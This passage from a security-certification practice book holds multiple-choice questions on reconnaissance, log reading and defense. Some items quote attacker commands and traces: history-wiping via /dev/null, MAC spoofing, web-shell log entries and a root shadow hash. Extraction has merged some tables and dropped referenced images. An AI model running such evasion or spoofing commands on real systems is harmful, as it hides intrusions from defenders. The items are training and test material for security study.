+A. Submit cmd.exe  to VirusTotal.
+B. Compare the hash of cmd.exe  to a known good version.
+C. Check the file using the National Software Reference Library.
+D. Run cmd.exe  to make sure its behavior is normal.
+110. What U.S. government program seeks to provide trusted sources that meet the following 
+requirements?
+ ■Provide a chain of custody for classified and unclassified integrated circuits
+ ■Ensure that there will not be any reasonable threats related to supply disruption
+ ■Prevent intentional or unintentional modification or tampering of integrated circuits
+ ■Protect integrated circuits from reverse engineering and vulnerability testing
+A. Trusted Foundry
+B. Chain of Custody
+C. Trusted Suppliers
+D. Trusted Access Program
+111. While reviewing netflows for a system on her network, Alice discovers the following  traffic pattern. What is occurring?
+Date flow start   Duration      Proto   Src    IP Addr:Port->Dst IP Addr:Port     Packets   Bytes   Flows
+2017-07-11        04:59:32.934  0.000   TCP    10.1.1.1:34543->10.2.2.6:22        1         60      12017-07-11        04:59:39.730  0.000   TCP    10.1.1.1:34544->10.2.2.7:22        1         60      12017-07-11        04:59:46.166  0.000   TCP    10.1.1.1:34545->10.2.2.8:22        1         60      12017-07-11        04:59:52.934  0.000   TCP    10.1.1.1:34546->10.2.2.9:22        1         60      12017-07-11        05:00:06.710  0.000   TCP    10.1.1.1:34547->10.2.2.10:22       1         60      12017-07-11        05:00:46.160  0.000   TCP    10.1.1.1:34548->10.2.2.11:22       1         60      12017-07-11        05:01:32.834  0.000   TCP    10.1.1.1:34549->10.2.2.12:22       1         60      12017-07-11        05:01:39.430  0.000   TCP    10.1.1.1:34550->10.2.2.13:22       1         60      12017-07-11        05:01:46.676  0.000   TCP    10.1.1.1:34551->10.2.2.14:22       1         60      1
+A. telnet scan
+B. ssh scan
+C. ssh scan with unsuccessful connection attempts
+D. sftp scan with unsuccessful connection attempts
+
+Chapter 1  ■ Domain 1: Threat Management  35
+112. Chris wants to gather as much information as he can about an organization using DNS 
+harvesting techniques. Which of the following methods will most easily provide the most useful information if they are all possible to conduct on the network he is targeting?
+A.
+ DNS record enumeration
+B. Zone transfer
+C. Reverse lookup
+D. Domain brute forcing
+113. The national insurance company that Luke works for has experienced a breach, and Luke 
+is attempting to categorize the impact. As he reviews the incident report, he notes that cus-tomer data that included Social Security numbers was exfiltrated from the organization. How should he categorize the impact?
+A.
+ As a regulated information breach
+B. As an intellectual property breach
+C. As a confidential information breach
+D. As an integrity loss
+114. As part of his reconnaissance effort, Chris enters usernames from public information 
+about a company into a site like checkusernames.com  and receives information like the 
+results shown here. What type of action is he performing?
+A. Social engineering
+B. Brute-force username guessing
+C. Social media profiling
+D. Phishing
+
+36 Chapter 1  ■ Domain 1: Threat Management
+115. Geoff wants to perform passive reconnaissance as part of an evaluation of his organiza-
+tion’s security controls. Which of the following techniques is a valid technique to perform as part of a passive DNS assessment?
+A.
+ A DNS forward or reverse lookup
+B. A zone transfer
+C. A WHOIS query
+D. Using maltego
+116. Mike’s penetration test requires him to use passive mapping techniques to discover net-
+work topology. Which of the following tools is best suited to that task?
+A. Wireshark
+B. nmap
+C. netcat
+D. Angry IP Scanner
+117. Geoff has been asked to identify a technical solution that will reduce the risk of captured 
+or stolen passwords being used to allow access to his organization’s systems. Which of the following technologies should he recommend?
+A.
+ Captive portals
+B. Multifactor authentication
+C. VPNs
+D. OAuth
+118. While gathering DNS information about an organization, Chris discovered multiple 
+AAAA records. What type of reconnaissance does this mean Chris may want to consider?
+A. Second-level DNS queries
+B. IPv6 scans
+C. Cross-domain resolution
+D. A CNAME verification
+119. Sharon wants to gather email addresses as part of her reconnaissance efforts. Which of the 
+following tools best suits her needs?
+A. nmap
+B. cree.py
+C. MailSnarf
+D. TheHarvester
+
+Chapter 1  ■ Domain 1: Threat Management  37
+120. After Charles completes a topology discovery scan of his local network, he sees the 
+Zenmap topology shown here. What can Charles determine from the Zenmap topology view?
+A. There are five hosts with port security enabled.
+B. DemoHost2 is running a firewall.
+C. DemoHost4 is running a firewall.
+D. There are four hosts with vulnerabilities and seven hosts that do not have  vulnerabilities.
+121.
+ Which of the following items is not one of the three important rules that should be  established before a penetration test?
+A.
+ Timing
+B. Reporting
+C. Scope
+D. Authorization
+
+38 Chapter 1  ■ Domain 1: Threat Management
+122. Scott is part of the white team who is overseeing his organization’s internal red and blue 
+teams during an exercise that requires each team to only perform actions appropriate to the penetration test phase they are in. During the reconnaissance phase, he notes the fol-lowing behavior as part of a Wireshark capture. What should he report?
+A. The blue team has succeeded.
+B. The red team is violating the rules of engagement.
+C. The red team has succeeded.
+D. The blue team is violating the rules of engagement.
+123. Jennifer analyzes a Wireshark packet capture from a network that she is unfamiliar with. She discovers that a host with IP address 10.11.140.13 is running services on TCP ports 636 and 443. What services is that system most likely running?
+A.
+ LDAPS and HTTPS
+B. FTPS and HTTPS
+C. RDP and HTTPS
+D. HTTP and Secure DNS
+124. Lauren inputs the following command on a Linux system:
+#echo 127.0.0.1 example.com >> /etc/hosts
+What has she done?A.
+ She has added the system to the allowed hosts file.
+B. She has routed traffic for the example.com  domain to the local host.
+C. She has routed local host traffic to example.com .
+D. She has overwritten the hosts file and will have deleted all data except this entry.
+125. While reviewing Apache logs, Cynthia notices the following log entries. What has 
+occurred?
+10.0.1.1 - POST /wordpress/wp-content/r57.php?1 200
+10.0.1.1 - GET /wordpress/wp-content/r57.php 200
+A. A file was downloaded and verified.
+B. A file was emailed.
+C. A file was moved to the wp-content  directory.
+D. A file was uploaded and verified.
+
+Chapter 1  ■ Domain 1: Threat Management  39
+126. Rhonda has identified a privilege escalation flaw on the system she targeted in the first 
+phase of her penetration test and is now ready to take the next step. According to the NIST 800-115 standard, what is step C that Rhonda needs to take, as shown in this  diagram?
+Gaining AccessEscalating
+PrivilegesCInstall
+Additional Tools
+A. System browsing
+B. Scanning
+C. Rooting
+D. Consolidation
+127. While conducting a penetration test, Ben executes the following command:
+ifconfig eth0 hw ether 08:00:27:06:d4
+What network protection is Ben most likely attempting to avoid?
+A. Port security
+B. NAC
+C. A firewall
+D. An IPS
+128. When Scott performs an nmap  scan with the -T flag set to 5, what variable is he changing?
+A. How fast the scan runs
+B. The TCP timeout flag it will set
+C. How many retries it will perform
+D. How long the scan will take to start up
+129. While conducting a port scan of a remote system, Henry discovers TCP port 1433 open. 
+What service can he typically expect to run on this port?
+A. Oracle
+B. VNC
+C. IRC
+D. Microsoft SQL
+
+40 Chapter 1  ■ Domain 1: Threat Management
+130. Every year, Alice downloads and reads a security industry published list of all the types 
+of attacks, compromises, and malware events that have occurred, that are becoming more prevalent, and that are decreasing in occurrence. What type of analysis can she perform using this information?
+A.
+ Anomaly
+B. Trend
+C. Heuristic
+D. Availability
+131. While application vulnerability scanning one of her target organizations web servers, 
+Andrea notices that the server’s hostname is resolving to a cloudflare.com  host. What 
+does Andrea know about her scan?
+A. It is being treated like a DDoS attack.
+B. It is scanning a CDN-hosted copy of the site.
+C. It will not return useful information.
+D. She cannot determine anything about the site based on this information.
+132. While conducting active reconnaissance, Lauren discovers a web remote management 
+application that appears to allow Windows command-line access on a server. What  command can she run to quickly determine what user the service is running as?
+A.
+ username
+B. showuser
+C. whoami
+D. cd c:\Users\%currentuser
+133. While tracking a potential APT on her network, Cynthia discovers a network flow for her 
+company’s central file server. What does this flow entry most likely show if 10.2.2.3 is not a system on her network?
+Date flow start     Duration Proto          Src   IP Addr:Port   Dst IP Addr:Port   Packets    Bytes    Flows 
+2017-07-11          13:06:46.343 21601804   TCP   10.1.1.1:1151->10.2.2.3:443       9473640    9.1 G    1 2017-07-11          13:06:46.551 21601804   TCP   10.2.2.3:443->10.1.1.1:1151       8345101    514 M    1
+A. A web browsing session
+B. Data exfiltration
+C. Data infiltration
+D. A vulnerability scan
+134. Chris wants to prevent users from running a popular game on Windows workstations he is 
+responsible for. How can Chris accomplish this for Windows 10 Pro workstations?
+A. Using application whitelisting to prevent all unallowed programs from running
+B. Using Windows Defender and adding the game to the blacklist file
+C. By listing it in the Blocked Programs list via secpol.msc
+D. You cannot blacklist applications in Windows 10 without a third-party application.
+
+Chapter 1  ■ Domain 1: Threat Management  41
+135. After a series of compromised accounts led to her domain being blacklisted, Lauren has 
+been asked to restore her company’s email as quickly as possible. Which of the following options is not a valid way to allow her company to send email successfully?
+A.
+ Migrate her company’s SMTP servers to new IP addresses.
+B. Migrate to a cloud email hosting provider.
+C. Change SMTP headers to prevent blacklisting.
+D. Work with the blacklisting organizations to get removed from the list.
+136. Part of Tracy’s penetration testing assignment is to evaluate the WPA2 Enterprise pro-
+tected wireless networks of her target organization. What major differences exist between reconnaissance of a wired network versus a wireless network?
+A.
+ Encryption and physical accessibility
+B. Network access control and encryption
+C. Port security and physical accessibility
+D. Authentication and encryption
+137. Ian’s company has an internal policy requiring that they perform regular port scans of all 
+of their servers. Ian has been part of a recent effort to move his organization’s servers to an infrastructure as a service provider. What change will Ian most likely need to make to his scanning efforts?
+A.
+ Change scanning software.
+B. Follow the service provider’s scan policies.
+C. Sign a security contract with the provider.
+D. Discontinue port scanning.
+138. During a regularly scheduled PCI compliance scan, Fred has discovered port 3389 open on 
+one of the point-of-sale terminals that he is responsible for managing. What service should he expect to find enabled on the system?
+A.
+ MySQL
+B. RDP
+C. TOR
+D. Jabber
+139. Cynthia knows that the organization she is scanning runs services on alternate ports to 
+attempt to reduce scans of default ports. As part of her intelligence-gathering process, she discovers services running on ports 8080 and 8443. What services are most likely running on these ports?
+A.
+ Botnet C&C
+B. Nginx
+C. Microsoft SQL Server instances
+D. Web servers
+
+42 Chapter 1  ■ Domain 1: Threat Management
+140. Lauren wants to identify all the printers on the subnets she is scanning with nmap . Which 
+of the following nmap  commands will not provide her with a list of likely printers?
+A. nmap -sS -p 9100,515,631 10.0.10.15/22 -oX printers.txt
+B. nmap -O 10.0.10.15/22 -oG - | grep printer >> printers.txt
+C. nmap -sU -p 9100,515,631 10.0.10.15/22 -oX printers.txt
+D. nmap -sS -O 10.0.10.15/22 -oG | grep >> printers.txt
+141. Chris knows that systems have connected to a remote host on TCP ports 1433 and 1434. If 
+he has no other data, what should his best guess be about what the host is?
+A. A print server
+B. A Microsoft SQL server
+C. A MySQL server
+D. A secure web server running on an alternate port
+142. What services will the following nmap  scan test for?
+nmap -sV -p 22,25,53,389 192.168.2.50/27
+A. telnet, SMTP, DHCP, MS-SQL
+B. ssh, SMTP, DNS, LDAP
+C. telnet, SNMP, DNS, LDAP
+D. ssh, SNMP, DNS, RDP
+143. While investigating a compromise, Glenn encounters evidence that a user account has been 
+added to the system he is reviewing. He runs a diff of /etc/shadow  and /etc/passwd  and 
+sees the following output. What has occurred?
+> root:$6$XHxtN5iB$5WOyg3gGfzr9QHPLo.7z0XIQIzEW6Q3/
+K7iipxG7ue04CmelkjC51SndpOcQlxTHmW4/AKKsKew4f3cb/.BK8/:16828:0:99999:7:::
+> daemon:*:16820:0:99999:7:::> bin:*:16820:0:99999:7:::> sys:*:16820:0:99999:7:::> sync:*:16820:0:99999:7:::> games:*:16820:0:99999:7:::> man:*:16820:0:99999:7:::> lp:*:16820:0:99999:7:::> mail:*:16820:0:99999:7:::> news:*:16820:0:99999:7:::> uucp:*:16820:0:99999:7:::> proxy:*:16820:0:99999:7:::> www-data:*:16820:0:99999:7:::> backup:*:16820:0:99999:7:::> list:*:16820:0:99999:7:::> irc:*:16820:0:99999:7:::
+
+Chapter 1  ■ Domain 1: Threat Management  43
+A. The root account has been compromised.
+B. An account named daemon has been added.
+C. The shadow password file has been modified.
+D. /etc/shadow  and /etc/passwd  cannot be diffed to create a useful comparison.
+144. While conducting a topology scan of a remote web server, Susan notes that the IP 
+addresses returned for the same DNS entry change over time. What has she likely  encountered?
+A.
+ A route change
+B. Fast flux DNS
+C. A load balancer
+D. An IP mismatch
+145. Attackers have been attempting to log into Alaina’s Cisco routers, causing thousands of log 
+entries, and she is worried they may eventually succeed. Which of the following options should she recommend to resolve this issue?
+A.
+ Prevent console login via ssh.
+B. Implement a login-block feature with back-off settings.
+C. Move the administrative interface to a protected network.
+D. Disable console access entirely.
+146. Ron is reviewing his team’s work as part of a reconnaissance effort and is checking  
+Wireshark packet captures. His team reported no open ports on 10.0.2.15. What issue should he identify with their scan based on the capture shown here?
+
+
+44 Chapter 1  ■ Domain 1: Threat Management
+A. The host was not up.
+B. Not all ports were scanned.
+C. The scan scanned only UDP ports.
+D. The scan was not run as root.
+147. John needs to protect his organization’s authentication system against brute-force attacks. 
+Which of the following control pairs are best suited to preventing a brute-force attack from succeeding if ease of use and maintenance is also important?
+A.
+ Passwords and PINs
+B. Passwords and biometrics
+C. Passwords and token-based authentication
+D. Token-based authentication and biometrics
+148. While reviewing the command history for an administrative user, Chris discovers a  
+suspicious command that was captured, shown here:
+ln /dev/null ~/.bash_history
+What action was this user attempting to perform?
+A. Enabling the bash history
+B. Appending the contents of /dev/null  to the bash history
+C. Logging all shell commands to /dev/null
+D. Allowing remote access from the null shell
+149. While attempting to stop a rogue service, Monica issues the following Linux command on 
+an Ubuntu system using upstart :
+service rogueservice stop
+After a reboot, she discovers the service running again. What happened, and what does she need to do to prevent this?
+A.
+ The service restarted at reboot; she needs to include the "-p" , or permanent flag.
+B. The service restarted itself; she needs to delete the binary associated with the service.
+C. The service restarted at reboot; she should add an .override  file to stop the service 
+from starting.
+D. A malicious user restarted the service; she needs to ensure users cannot restart  
+services.
+150. Lucca wants to validate DNS responses to ensure that they are from authoritative DNS servers. What technology can he use to do this?
+A.
+ DNSSEC
+B. DNSCrypt
+
+Chapter 1  ■ Domain 1: Threat Management  45
+C. DNShield
+D. DNS is an open protocol and does not support secure validation.
+151. Nathan has been asked to monitor and manage the environment in which a cybersecurity 
+exercise is conducted. What team is he on?
+A. Red team
+B. White team
+C. Blue team
+D. Black team
+152. Allan’s nmap  scan includes a line that starts with cpe:/o . What type of information should 
+he expect to gather from the entry?A.
+ Common privilege escalation
+B. Operating system
+C. Certificate performance evaluation
+D. Hardware identification
+153. Which of the following items is not typically included in the rules of engagement for a pen-
+etration test?
+A. Timing
+B. Authorization
+C. Scope
+D. Authorized tools
+154. Isaac wants to prevent hosts from connecting to known malware distribution domains. 
+What type of solution can he use to do this without deploying endpoint protection  software or an IPS?
+A.
+ Route poisoning
+B. Anti-malware router filters
+C. Subdomain whitelisting
+D. DNS blackholing
+155. While scanning a network, Frank discovers a host running a service on TCP ports 1812 
+and 1813. What type of server has Frank most likely discovered?
+A. RADIUS
+B. VNC
+C. Kerberos
+D. Postgres
+
+46 Chapter 1  ■ Domain 1: Threat Management
+156. While reviewing output from netstat , John sees the following output. What should his 
+next action be?
+[minesweeper.exe]
+  TCP    127.0.0.1:62522        dynamo:0               LISTENING[minesweeper.exe]  TCP    192.168.1.100        151.101.2.69:https           ESTABLISHED
+A. Capture traffic to 151.101.2.69 using Wireshark.
+B. Initiate the organization’s incident response plan.
+C. Check to see whether 151.101.2.69 is a valid Microsoft address.
+D. Ignore it, because this is a false positive.
+157. Shane wants to conduct an nmap  scan of a firewalled subnet. Which of the following is not 
+an nmap  firewall evasion technique he could use?
+A. Fragmenting packets
+B. Changing packet header flags
+C. Spoofing the source IP
+D. Appending random data
+158. Alex is observing a penetration tester who has gained access to a Windows domain con-
+troller. The penetration tester runs a program called fgdump  and gathers information from 
+the system. What type of information has the penetration tester targeted?
+A. File and group information
+B. Password and usernames
+C. Active Directory full GPO lists
+D. Nothing, because FGDump is a Linux tool.
+159. Which of the following commands will provide Ben with the most information about a host?A.
+ dig -x [ip address]
+B. host [ip address]
+C. nslookup [ip address]
+D. zonet [ip address]
+160. Selah suspects that the Linux system she has just logged into may be Trojaned and wants 
+to check where the bash shell she is running is being executed from. What command should she run to determine this?
+A.
+ where bash
+B. ls -l bash
+C. which bash
+D. printenv bash
+
+Chapter 1  ■ Domain 1: Threat Management  47
+161. Adam needs to provide ssh access to systems behind his data center firewall. If Adam’s 
+organization uses the system architecture shown here, what is the system at point A called?
+InternetFirewall or
+Uniﬁed
+Security
+Deivce
+TCP 22 / ssh ConnectionA
+Data Center
+Servers
+A. A firewall-hopper
+B. An isolated system
+C. A moat-protected host
+D. A jump box
+162. Angela wants to block traffic sent to a suspected malicious host. What iptables  rule 
+entry can she use to block traffic to a host with IP address 10.24.31.11?
+A. iptables -A OUTPUT -d 10.24.31.11 -j DROP
+B. iptables -A INPUT -d 10.24.31.11 -j ADD
+C. iptables -block -host 10.24.31.11 -j DROP
+D. iptables -block -ip 10.24.31.11 -j ADD
+163. Fred’s reconnaissance of an organization includes a search of the Censys network search 
+engine. There, he discovers multiple certificates with validity dates as shown here:
+Validity2016-07-07 00:00:00to 2017-08-11 23:59:59 (400 days, 23:59:59)2016-07-08 00:00:00to 2017-08-12 23:59:59 (400 days, 23:59:59)2017-07-11 00:00:00to 2018-08-15 23:59:59 (400 days, 23:59:59)What should Fred record in his reconnaissance notes?
+A.
+ The certificates expired as expected, showing proper business practice.
+B. The certificates were expired by the CA, possibly due to nonpayment.
+C. The system that hosts the certificates may have been compromised.
+D. The CA may have been compromised, leading to certificate expiration.
+
+48 Chapter 1  ■ Domain 1: Threat Management
+164. After receiving a penetration test report, Rick has decided to implement anti-harvesting 
+techniques for his organization’s DNS. Which of the following sets of techniques is best suited to preventing bulk and automated information gathering?
+A.
+ CAPTCHA and proxy services
+B. Rate limiting and CAPTCHA
+C. Not publishing TLD zone files and blacklisting
+D. CAPTCHA and blacklisting
+165. When Casey scanned a network host, she received the results shown here. What does she 
+know based on the scan results?
+A. The device is a Cisco device.
+B. The device is running CentOS.
+C. The device was built by IBM.
+D. None of the above
+166. What is a document that lists sensitive data-handling rules, contact information, black-box testing, and status meeting schedules called during a penetration test?
+A.
+ The “get out of jail free” card
+B. The rules of engagement
+C. Executive sign-off
+D. A penetration test standard
+167. Fred conducts an SNMP sweep of a target organization and receives no-response replies 
+from multiple addresses that he believes belong to active hosts. What does this mean?
+A. The machines are unreachable.
+B. The machines are not running SNMP servers.
+C. The community string he used is invalid.
+D. Any or all of the above may be true.
+168. Angela wants to gather detailed information about the hosts on a network passively. If she 
+has access to a Wireshark pcap file from the network, which of the following tools can she use to provide automated analysis of the file?
+A.
+ ettercap
+B. NetworkMiner
+C. Sharkbait
+D. dradis
+
+Chapter 1  ■ Domain 1: Threat Management  49
+169. Rick’s security research company wants to gather data about current attacks and sets up a 
+number of intentionally vulnerable systems that allow his team to log and analyze exploits and attack tools. What type of environment has Rick set up?
+A.
+ A tarpit
+B. A honeypot
+C. A honeynet
+D. A blackhole
+170. While performing reconnaissance of an organization’s network, Angela discovers that 
+web.organization.com , www.organization.com , and documents.organization.com  
+all point to the same host. What type of DNS record allows this?A.
+ A CNAME
+B. An MX record
+C. An SPF record
+D. An SOA record
+171. Susan wants to prevent attackers from running specific files and also wants to lock down 
+other parts of the Windows operating system to limit the impact of attackers who have access to workstations she is responsible for. If she wants to do this on Windows 10 work-stations, what tool should she use?
+A.
+ Secpol.msc
+B. FileVault
+C. AppLocker
+172. While reviewing the auth.log  file on a Linux system she is responsible for, Tiffany discov-
+ers the following log entries:
+Aug  6 14:13:06 demo sshd[5273]: PAM 5 more authentication failures; 
+logname= uid=0 euid=0 tty=ssh ruser= rhost=127.0.0.1  user=root
+Aug  6 14:13:06 demo sshd[5273]: PAM service(sshd) ignoring max retries; 6 > 3Aug  6 14:13:07 demo sshd[5280]: Failed password for root from 127.0.0.1 
+port 38463 ssh2
+Aug  6 14:13:07 demo sshd[5280]: error: maximum authentication attempts 
+exceeded for root from 127.0.0.1 port 38463 ssh2 [preauth]
+Aug  6 14:13:07 demo sshd[5280]: Disconnecting: Too many authentication 
+failures [preauth]
+Which of the following has not occurred?
+A. A user has attempted to re-authenticate too many times.
+B. PAM is configured for three retries and will reject any additional retries in the same 
+session.
+C. Fail2ban has blocked the ssh login attempts.
+D. Root is attempting to log in via ssh from the local host.
+
+50 Chapter 1  ■ Domain 1: Threat Management
+173. Chris operates the point-of-sale network for a company that accepts credit cards and is 
+thus required to be compliant with PCI-DSS. During his regular assessment of the point-of-sale terminals, he discovers that a recent Windows operating system vulnerability exists on all of them. Since they are all embedded systems that require a manufacturer update, he knows that he cannot install the available patch. What is Chris’s best option to stay com-pliant with PCI-DSS and protect his vulnerable systems?
+A.
+ Replace the Windows embedded point-of-sale terminals with standard Windows  
+systems.
+B. Build a custom operating system image that includes the patch.
+C. Identify, implement, and document compensating controls.
+D. Remove the POS terminals from the network until the vendor releases a patch.
+174. Senior management in Adam’s company recently read a number of articles about massive ransomware attacks that successfully targeted organizations like the one that Adam is a part of. Adam’s organization already uses layered security solutions including a border IPS, firewalls between network zones, local host firewalls, antivirus software, and a con-figuration management system that applies recommended operating system best practice settings to their workstations. What should Adam recommend to minimize the impact of a similar ransomware outbreak at his organization?
+A.
+ Honeypots
+B. Backups
+C. Anti-malware software
+D. A next-generation firewall appliance
+175. Which of the following tools is not typically associated with the reconnaissance phase of a 
+penetration test?
+A. Metasploit
+B. nmap
+C. Nessus
+D. Maltego
+176. What occurs when Alex uses the following command to perform an nmap  scan of a  
+network?
+nmap -sP 192.168.2.0/24
+A. A secure port scan of all hosts in the 192.168.0.0 to 192.168.2.255 network range
+B. A scan of all hosts that respond to ping  in the 192.168.0.0 to 192.168.255.255  
+network range
+C. A scan of all hosts that respond to ping  in the 192.168.2.0 to 192.168.2.255 network 
+range
+D. A SYN-based portscan of all hosts in the 192.168.2.0 to 192.168.2.255 network 
+range
+
+Chapter 1  ■ Domain 1: Threat Management  51
+177. As part of her malware analysis process, Kara builds a diagram of the components of the 
+suspected malware package. At each stage, she unpacks, de-obfuscates, and identifies each subcomponent, adding it to her diagram. What is this process known as?
+Base64
+DecodedFile
+UnpackedPacker
+IdentiﬁedSuspected
+MalwareSystem
+ResourcesComponents
+conﬁg.ini
+suspect.dll
+screen.bin
+core.cab
+A. Decomposition
+B. Disassembly
+C. Reverse archiving
+D. Fingerprinting
+178. Aubrey is reviewing her firewall logs for signs of attacks in her role as a blue team member during a penetration test. Which of the following types of attack is she least likely to be able to identify using a stateful packet inspection firewall?
+A.
+ A SYN flood
+B. A SQL injection attack
+C. A port scan
+D. A DDoS attack
+179. Geoff’s remote scans of a target organization’s class C network block using nmap   
+(nmap -sS 10.0.10.1/24 ) show only a single web server. If Geoff needs to gather addi-
+tional reconnaissance information about the organization’s network, which of the follow-
+ing scanning techniques is most likely to provide additional detail?
+A. Use a UDP scan.
+B. Perform a scan from on-site.
+C. Scan using the -p 1-65535  flag.
+D. Use nmap ’s IPS evasion techniques.
+
+52 Chapter 1  ■ Domain 1: Threat Management
+180. During her normal daily review process, Jennifer detects an external system that is sys-
+tematically conducting traceroute  operations to each of the systems and devices in her 
+network. What activity is most likely occurring?
+A. A regularly scheduled network scan from her company’s ISP
+B. A vulnerability scan
+C. Network topology reconnaissance
+D. Router probes to determine the best routes via BGP discovery
+181. Why does the U.S. government require Trusted Foundry and related requirements for  
+technology?
+A. To control prices
+B. To ensure standards compatibility
+C. To prevent hardware-level compromise of devices
+D. To ensure U.S.-based supplier viability for strategic components
+182. As part of an externally accessible information review by their security team, Bob and Lisa 
+receive information that the security team gathered including the following entry:
+Query Results:
+Router: Ashburn, VA - US Command: show bgp ipv4 unicast 10.81.254.195 BGP routing table entry for 10.64.0.0/11Versions:  Process           bRIB/RIB  SendTblVer  Speaker          287479994   287479994Last Modified: Feb 22 09:16:16.154 for 8w0dPaths: (13 available, best #13)  Advertised to update-groups (with more than one peer):    0.1 0.14 0.29 0.30 0.33 0.34 0.36 0.45   Advertised to peers (in unique update groups):    10.250.31.182    Path #1: Received by speaker 0  Not advertised to any peer  7922    10.242.151.65 (metric 6710) from  (129.250.0.162)      Origin IGP, metric 4294967294, localpref 98, valid, confed-internal      Received Path ID 0, Local Path ID 0, version 0      Community: 2914:390 2914:1006 2914:2000 2914:3000 65504:7922      Originator: 10.250.0.162, Cluster list: 10.250.0.9    .... Path #13: Received by speaker 0  Advertised to update-groups (with more than one peer):    0.1 0.14 0.29 0.30 0.33 0.34 0.36 0.45 
+
+Chapter 1  ■ Domain 1: Threat Management  53
+  Advertised to peers (in unique update groups):
+    10.250.31.182    7922
+What type of tool could they use to gather this publicly available information about their 
+systems in the future?
+A. nmap
+B. A BGP looking glass
+C. A BGP reflector
+D. A route/path assimilator
+183. A system that Jeff is responsible for has been experiencing consistent denial-of-service 
+attacks using a version of the Low Orbit Ion Cannon (LOIC) that leverages personal com-puters in a concerted attack by sending large amounts of traffic from each system to flood a server, thus making it unable to respond to legitimate requests. What type of firewall rule should Jeff use to limit the impact of a tool like this if bandwidth consumption from the attack itself is not the root problem?
+A.
+ IP-based blacklisting
+B. Drop all SYN packets.
+C. Use a connection rate or volume-limiting filter per IP.
+D. Use a route-blocking filter that analyzes common LOIC routes.
+184. Chris wants to limit the ability of attackers to conduct passive fingerprinting exercises on 
+his network. Which of the following practices will help to mitigate this risk?
+A. Implement an IPS.
+B. Implement a firewall.
+C. Disable promiscuous mode for NICs.
+D. Enable promiscuous mode for NICs.
+185. Geoff wants to gather a list of all Windows services and their current state using a  
+command-line tool. What tool can he use to gather this information for later processing?
+A. svcctl -l
+B. service list
+C. service -l
+D. sc query
+186. While reviewing Shodan scan data for his organization, Adam finds the following infor-
+mation. What type of system has he discovered?
+
+
+54 Chapter 1  ■ Domain 1: Threat Management
+A. A botnet administration system
+B. A control and data acquisition system
+C. A noncaching web server
+D. A NAS
+Use the following scenario and image to answer the following three questions:
+While reviewing a system she is responsible for, Amanda notices that the system is per-
+forming poorly and runs htop  to see a graphical representation of system resource usage. 
+She sees the following information:
+187. What issue should Amanda report to the system administrator?
+A. High network utilization
+B. High memory utilization
+C. Insufficient swap space
+D. High CPU utilization
+188. What command could Amanda run to find the process with the highest CPU utilization if 
+she did not have access to htop ?
+A. ps
+B. top
+C. proc
+D. load
+189. What command can Amanda use to terminate the process?
+A. term
+B. stop
+C. end
+D. kill
+
+Chapter 1  ■ Domain 1: Threat Management  55
+190. During Geoff’s configuration of his organization’s network access control policies, he sets 
+up client OS rules that include the following statements:
+ALLOW Windows 7 version *, Windows 10 version *
+ALLOW OSX version *ALLOW iOS 8.1, iOS 9 version *ALLOW Android 7.*
+After deploying this rule, he discovers that many devices on his network cannot connect. 
+What issue is most likely occurring?
+A. Insecure clients
+B. Incorrect NAC client versions
+C. OS version mismatch
+D. Patch-level mismatch
+191. Lauren submits a suspected malware file to malwr.com  and receives the following informa-
+tion about its behavior. What type of tool is malwr.com ?
+A. A reverse-engineering tool
+B. A static analysis sandbox
+C. A dynamic analysis sandbox
+D. A decompiler sandbox
+192. Fred has been tasked with configuring his organization’s NAC rules to ensure that 
+employees only have access that matches their job functions. Which of the following NAC criteria are least suited to filtering based on a user’s job?
+A.
+ Time-based
+B. Rule-based
+C. Role-based
+D. Location-based
+
+56 Chapter 1  ■ Domain 1: Threat Management
+193. Charles is investigating a process that he believes may be malicious. What Linux command 
+can he use to determine what files that process has open?
+A. ps
+B. procmap
+C. lsof
+D. filemap
+194. After a popular website is hacked, Chris begins to hear reports that email addresses from 
+his company’s domain are listed in the hacker’s data dump. Chris knows that the list includes passwords and is concerned that his users may have used the same password for the site and their own company account. If the hackers recovered MD5 hashed passwords, how can he check them against the strong password hashes his company uses?
+A.
+ Reverse the MD5 hashes and then rehash using the company’s method and compare.
+B. Reverse the MD5 and strong company hashes and then compare the password.
+C. Use rainbow tables to recover the passwords from the dump and then rehash using the 
+company’s strong method and compare.
+D. Chris cannot accomplish this task; hashes cannot be reversed.
+195. As part of his active reconnaissance activities, Frank is provided with a shell account accessible via ssh. If Frank wants to run a default 
+nmap  scan on the network behind the 
+firewall shown here, how can he accomplish this?
+Internal
+Protected
+Network
+192.168.34.0-
+192.168.34.255External HostShell Host: 192.168.34.11
+A. ssh -t 192.168.34.11 nmap 192.168.34.0/24
+B. ssh -R 8080:192.168.34.11:8080 [remote account:remote password]
+C. ssh -proxy 192.168.11 [remote account:remote password]
+D. Frank cannot scan multiple ports with a single ssh command.
+
+Chapter 1  ■ Domain 1: Threat Management  57
+196. Angela captured the following packets during a reconnaissance effort run by her organiza-
+tion’s red team. What type of information are they looking for?
+A. Vulnerable web applications
+B. SQL injection
+C. Directory traversal attacks
+D. Passwords
+197. Which sources are most commonly used to gather information about technologies a target organization uses during intelligence gathering?
+A.
+ OSINT searches of support forums and social engineering
+B. Port scanning and social engineering
+C. Social media review and document metadata
+D. Social engineering and document metadata
+198. Geoff wants to prevent spammers from harvesting his organization’s public LDAP direc-
+tory. What technology should he implement?
+A. A firewall
+B. An IDS
+C. Set hard limits
+D. Require authentication
+199. How can Saria remediate the issue shown here in the MBSA screenshot?
+
+
+58 Chapter 1  ■ Domain 1: Threat Management
+A. Force all users to set a complex password.
+B. Set a minimum password age.
+C. Enforce password expiration.
+D. This is not a problem.
+200. Greg configures his next-generation firewall security device to forge DNS responses for 
+known malicious domains. This results in users who attempt to visit sites hosted by those domains to see a landing page that Greg controls that advises them they were prevented from visiting a malicious site. What is this technique known as?
+A.
+ DNS masquerading
+B. DNS sinkholing
+C. DNS re-sequencing
+D. DNS hierarchy revision
+201. While reviewing a malware sample, Adam discovers that code inside of it appears to be 
+obfuscated. Which of the following encoding methods is commonly used to prevent code from being easily read by simply opening the file?
+A.
+ QR coding
+B. Base64
+C. Base128
+D. XINT
+202. Jennifer is an Active Directory domain administrator for her company and knows that 
+a quickly spreading botnet relies on a series of domain names for command and control and that preventing access to those domain names will cause the malware infection that connects to the botnet to fail to take further action. Which of the following actions is her best option if she wants to prevent off-site Windows users from connecting to botnet command-and-control systems?
+A.
+ Force a BGP update.
+B. Set up a DNS sinkhole.
+C. Modify the hosts file.
+D. Install an anti-malware application.
+203. Charleen works for a U.S. government contractor that uses NIST’s definitions to describe 
+threat categories. How should she categorize the threat posed by competitors that might seek to compromise her organization’s website?
+A.
+ Adversarial
